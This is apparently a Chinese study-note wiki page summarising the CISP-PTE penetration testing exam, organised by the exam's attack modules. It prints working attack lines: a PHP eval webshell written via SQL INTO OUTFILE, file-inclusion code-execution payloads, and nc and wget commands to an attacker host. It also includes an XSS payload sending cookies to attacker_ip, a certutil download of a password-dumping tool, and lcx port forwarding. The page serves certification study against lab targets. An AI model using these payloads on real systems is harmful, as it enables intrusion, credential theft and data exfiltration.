---
title: CISP-PTE 渗透测试工程师考试知识点总结
description: CISP-PTE 渗透测试工程师认证考试核心知识点系统梳理，涵盖 SQL 注入、文件上传、文件包含、命令执行、日志审计/XSS、综合渗透实战六大模块，附常用工具链与实战命令速查，适合备考与渗透测试基础巩固。
category: program-analysis
tags:
- CISP-PTE
- 渗透测试
- SQL注入
- 文件上传
- 文件包含
- 命令执行
- XSS
- 日志审计
- 内网渗透
- 提权
- sqlmap
- 实战案例
date: 2020-07-01
updated: '2026-11-15'
---
# CISP-PTE 渗透测试工程师考试知识点总结

> 来源：微信公众号归档文章《cisp-pte渗透工程师考试总结》（2020-07）
>
> 考试形式：选择题 20 分 + 实操题 80 分，满分 100 分，70 分通过。整体难度接近 CTF 入门水平。

---

## 考试结构概览

| 题型 | 分值 | 说明 |
|------|------|------|
| 选择题 | 20 分 | 20 道，考查安全基础知识，建议拿 10+ 分 |
| 实操题 | 80 分 | 6 大题：SQL注入、文件上传、文件包含、命令执行、日志审计/XSS、综合渗透分析（3 小题） |

> **考试环境与工具包**：公众号发送 `pte` 即可获取。

---

## SQL 注入

考察重点：**手工联合查询** 与 **sqlmap 自动化利用**，目标多为 MySQL。

### 手工 UNION 注入标准流程

```sql
-- 1. 判断列数
ORDER BY n / UNION SELECT 1,2,3...

-- 2. 爆库名
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()

-- 3. 爆列名
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='geekuser'

-- 4. 拖数据
SELECT GROUP_CONCAT(username) FROM geekuser
```

### sqlmap 核心命令速查

| 目的 | 命令模板 |
|------|----------|
| 当前用户 | `sqlmap.py -u "URL" -p param --current-user` |
| 当前库 | `sqlmap.py -u "URL" -p param --current-db` |
| 所有表 | `sqlmap.py -u "URL" -p param -D dbname --tables` |
| 表列名 | `sqlmap.py -u "URL" -p param -D dbname -T tbl --columns` |
| 拖库数据 | `sqlmap.py -u "URL" -p param -D dbname -T tbl -C col1,col2 --dump` |
| 读文件 | `sqlmap.py -u "URL" -p param --dbms mysql --level 3 --risk 3 -D dbname --file-read "/path/to/key"` |
| 写 Shell | `UNION SELECT 1,"<?php @eval($_GET[x]);?>",3,4,5 INTO OUTFILE 'C:/Inetpub/wwwroot/cc.php'` |

> 相关深度页面：[[ctfshow-web-sql-injection-bypass-basics]]、[[mysql-duplicate-entry-error-based-sqli]]、[[mysql-dnslog-injection-loadfile-unc]]、[[sqlmap-api-automation]]、[[buuctf-web-writeup-collection]]、[[attack-defense-world-master-advanced-writeup]]、[[attack-defense-world-beginner-web-writeup]]

### Key 位置三大典型场景

1. **题干给定路径** → 直接 `--file-read` 读取
2. **后台管理页面** → 爆库拿账号密码 → 登录后台获取 Key
3. **网站目录下** → `INTO OUTFILE` 写马 → 蚁剑/菜刀连接读取

---

## 文件上传漏洞

考察基础绕过技巧，**刷通 Upload-Labs 即可覆盖考点**：

- JS 前端校验绕过（禁用 JS / 抓包改包）
- 后缀名黑/白名单绕过（`.php5`、`.phtml`、大小写、双写 `.phpphp`）
- `%00` 截断（PHP < 5.3.4）
- `Content-Type` 伪造
- `getimagesize()` 绕过（图片马：`exif_imagetype` / 图片头 + PHP 代码）
- **免杀马上传**（考题可能校验文件内容）

> 相关实战页面：[[cnvd-2021-49104-eoffice-v9-file-upload-rce]]、[[pikachu-target-writeup-part4]]、[[buuctf-web-writeup-collection]]、[[php-webshell-fundamentals-chopper-analysis]]、[[php-webshell-obfuscation-av-evasion]]

---

## 文件包含漏洞

核心考点：**PHP 伪协议利用** 与 **远程文件包含 (RFI)**。

### 常用伪协议 Payload

| 协议 | 用法示例 | 说明 |
|------|----------|------|
| `php://filter` | `?file=php://filter/convert.base64-encode/resource=index.php` | 读取源码绕过执行 |
| `php://input` | `?file=php://input` + POST `<?php system('id');?>` | 直接执行 POST 体代码 |
| `data://` | `?file=data://text/plain,<?php phpinfo();?>` | 内联代码执行 |
| `file://` | `?file=file:///D:/www/index.txt` | 绝对路径读取 |
| `phar://` | `?file=phar://archive.zip/shell.php` | PHAR 反序列化/包含 |
| `zip://` | `?file=zip://archive.zip%23shell.php` | ZIP 压缩包包含 |

### 远程文件包含 (RFI)

需 `allow_url_include=On`，可在公网 VPS 放置 `shell.txt`，Payload：`?file=http://vps/shell.txt`。

> 相关深度页面：[[php-file-inclusion-vulnerability]]、[[xd-security-file-inclusion-notes]]、[[huxiangbei-willphp-file-inclusion-writeup]]、[[attack-defense-world-master-advanced-writeup]]、[[php伪协议与反序列化利用]]

---

## 命令执行漏洞

考察 **命令拼接符**、**Linux 花式读文件**、**数据外带** 等绕过技巧。

### 命令拼接符速查

| 符号 | 含义 |
|------|------|
| `;` | 顺序执行，互不影响 |
| `&&` | 前命令成功才执行后命令 |
| `||` | 前命令失败才执行后命令 |
| `|` | 管道传递输出 |
| `` `cmd` `` / `$(cmd)` | 命令替换 |

### Linux 非常规读文件命令（目标：`flag.txt`）

```bash
# 1. static-sh
static-sh ./flag.txt
# 输出: ./flag.txt: line 1: flag{...}: not found

# 2. paste
paste ./flag.txt /etc/passwd

# 3. diff
diff ./flag.txt /etc/passwd

# 4. od
od -a ./flag.txt

# 5. bzmore / bzless
bzmore ./flag.txt
bzless ./flag.txt

# 6. curl file 协议
curl file:///home/user/flag.txt

# 7. nc 传输
# 靶机: nc attacker_ip 4444 < /var/www/html/key.php
# 攻击机: nc -l 4444 > key.txt

# 8. wget 下载
wget http://attacker_ip/evil.sh -P /tmp
```

### 绕过 `disable_functions` / `open_basedir` 等进阶技巧

参考 [[ctf-show-php-command-execution-bypass-techniques]]、[[ssi-server-side-includes-injection]]、[[attack-defense-world-beginner-web-writeup]]。

---

## 日志审计 与 XSS

### 日志审计标准流程

1. **下载日志文件**（访问日志 / 错误日志 / 数据库日志）
2. **全量浏览** 定位异常时间点
3. **按 IP 筛选** 疑似攻击者
4. 重点关注：
   - 响应状态 `200` / `500`
   - 敏感目录访问（`/admin`、`/backup`、`/phpmyadmin`）
   - `POST` 包体（SQLi、命令执行、文件上传）
   - `GET` 参数（XSS、LFI、SSRF）

> 相关实战：[[xd-security-incident-response-notes]]、[[threat-attribution-tracing-techniques]]、[[log4j2-rce-reproduction]]

### XSS 实战要点

- 考题**不提供 XSS 平台**，需本地 `nc -lvvp 8080` 监听接收 Cookie
- 构造 Payload：`<script>document.location='http://attacker_ip:8080/?c='+document.cookie</script>`
- 触发点：反射型（URL 参数）、存储型（留言板、用户名）、DOM 型

> 相关深度页面：[[pikachu-target-writeup-part2]]、[[xss-haozi-lab-walkthrough]]、[[xd-security-xss-vulnerability-notes-day25-28]]、[[cve-2022-30489-wavlink-wn535g3-post-xss-analysis]]、[[websocket-vulnerabilities-analysis]]

---

## 综合渗透实战（三小题连环）

**典型环境**：Windows Server 2003 + IIS 6/7 + ASP/ASPX + MSSQL。

### 第一题：弱口令爆破 → 后台拿 Key

- 确定用户名（非必然 `admin`，从页面/注释/JS 推断）
- 字典可能由题目提前给出（压缩包、阅读文件、robots.txt）
- 登录后台 → 直接查看 Key 或功能点获取

### 第二题：目录扫描 → 备份文件泄露 → 数据库连接 → 拿 Key

```text
工具：御剑 / dirsearch / dirb
目标：*.bak、*.zip、*.rar、*.sql、WEB-INF/web.xml、config.asp、conn.asp
流程：
1. 扫描出 backup.zip / wwwroot.rar
2. 下载解压 → 找到数据库连接串（sa / 弱口令）
3. Navicat / SQL Server Management Studio 连接
4. 查表拖库 → 获取 Key2
```

### 第三题：MSSQL 提权 → 系统权限 → 远程桌面 / 端口转发 → 拿 Key3

#### 开启 `xp_cmdshell`

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-- 执行命令
EXEC master.dbo.xp_cmdshell 'whoami';
```

#### 上传 `getpass.exe` / `mimikatz` 抓取管理员明文密码

```cmd
xp_cmdshell 'certutil -urlcache -f http://attacker_ip/getpass.exe C:\Windows\Temp\getpass.exe'
xp_cmdshell 'C:\Windows\Temp\getpass.exe'
```

#### 开启 3389 远程桌面

```cmd
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
```

#### 3389 不出网 → lcx 端口转发

```text
# 攻击机 (公网 IP 2.2.2.2)
lcx -listen 2222 3333

# 靶机
lcx -slave 2.2.2.2 2222 127.0.0.1 3389

# 连接方式：mstsc 2.2.2.2:3333
```

#### 登录桌面 → Key 通常在桌面或回收站

> 相关实战案例页面：[[0x6270-penetration-test-case-study-2023]]、[[card-game-platform-penetration-test-case-study]]、[[listed-company-penetration-test-case-study]]、[[medical-system-internal-penetration-case-study]]、[[loan-company-penetration-test-case-study]]、[[xd-security-internal-network-penetration-notes-day65-66]]、[[xd-security-internal-network-penetration-notes-day67-68]]、[[xd-security-internal-network-penetration-notes-day69-70]]、[[xd-security-privilege-escalation-notes-day58-64]]、[[frp内网渗透应用]]

---

## 核心工具链速查表

| 类别 | 工具 | 典型用途 |
|------|------|----------|
| SQL 注入 | sqlmap、Havij、SQLMapAPI | 自动化注入、批量验证 |
| 目录扫描 | 御剑、dirsearch、dirb、ffuf | 备份文件、敏感目录发现 |
| 文件上传 | Burp Suite、蚁剑、哥斯拉、中国菜刀 | 抓包改包、WebShell 管理 |
| 文件包含 | Burp Suite、curl、自写脚本 | 伪协议利用、RFI 验证 |
| 命令执行 | nc、curl、wget、ldapsearch、static-sh、paste、diff、od、bzmore | 绕过禁用函数、数据外带 |
| 日志审计 | Notepad++、grep、awk、ELK、自写脚本 | 大文本分析、IP 关联 |
| XSS 接收 | nc、XSS Platform、BeEF、XSStrike | Cookie 劫持、盲打验证 |
| 内网穿透 | lcx、frp、nps、ngrok、reGeorg、Proxifier、SocksCap64 | 端口转发、SOCKS 代理 |
| 凭证导出 | Mimikatz、getpass、LaZagne、Procdump、sekurlsa | 明文/Hash 抓取 |
| 远程控制 | Cobalt Strike、Metasploit、Covenant、Venom、CrossC2 | C2 上线、横向移动 |
| 提权辅助 | Windows-Exploit-Suggester、Sherlock、Linux-Exploit-Suggester、DirtyCow、Potato 系列 | 内核/服务配置提权 |

---

## 备考建议与学习路径

1. **基础夯实**：通读《Web 安全渗透测试实战》《SQL 注入攻击与防御》《内网渗透提权技术》
2. **靶场刷题**：
   - SQLi：[[ctfshow-web-sql-injection-bypass-basics]]、[[buuctf-web-writeup-collection]]、[[attack-defense-world-beginner-web-writeup]]
   - 上传/包含/执行：[[pikachu-target-writeup-part4]]、[[uploadlabs]]、[[php-file-inclusion-vulnerability]]
   - XSS：[[pikachu-target-writeup-part2]]、[[xss-haozi-lab-walkthrough]]
   - 综合实战：[[vulnhub-platform-resource-index]]、[[xd-security-pentest-course-curriculum]]
3. **工具精通**：sqlmap 参数全掌握、Burp Suite Intruder 四模式、lcx/frp 正反向转发、Navicat 连接 MSSQL/MySQL
4. **实战复现**：跟着 [[0x6270-penetration-test-case-study-2023]]、[[card-game-platform-penetration-test-case-study]] 完整复现一遍“Web 入口 → 提权 → 内网横向 → 拿 Key”全链路
5. **考前模拟**：搭建 Win2003 + IIS + ASP + MSSQL 环境，计时完成六大题

---

## 交叉引用索引

- SQL 注入进阶：[[ctfshow-web-sql-injection-bypass-basics]]、[[mysql-duplicate-entry-error-based-sqli]]、[[mysql-dnslog-injection-loadfile-unc]]、[[sqlmap-api-automation]]
- 文件上传/包含/执行：[[pikachu-target-writeup-part4]]、[[php-file-inclusion-vulnerability]]、[[ctf-show-php-command-execution-bypass-techniques]]、[[cnvd-2021-49104-eoffice-v9-file-upload-rce]]
- XSS/日志审计：[[pikachu-target-writeup-part2]]、[[xd-security-xss-vulnerability-notes-day25-28]]、[[xd-security-incident-response-notes]]
- 内网渗透/提权/横向：[[xd-security-internal-network-penetration-notes-day65-66]]、[[xd-security-internal-network-penetration-notes-day67-68]]、[[xd-security-internal-network-penetration-notes-day69-70]]、[[xd-security-privilege-escalation-notes-day58-64]]、[[0x6270-penetration-test-case-study-2023]]
- 实战案例库：[[card-game-platform-penetration-test-case-study]]、[[listed-company-penetration-test-case-study]]、[[medical-system-internal-penetration-case-study]]、[[loan-company-penetration-test-case-study]]、[[vulnhub-platform-resource-index]]

---

> **提示**：本页面基于 2020 年考试大纲整理，考试环境与工具版本可能随时间更新，建议结合最新官方教材与 [[xd-security-pentest-course-curriculum]] 持续跟进。

## 来源

- [102网络攻防实验室-202102-202203_7](../sources/102网络攻防实验室-202102-202203_7.md)
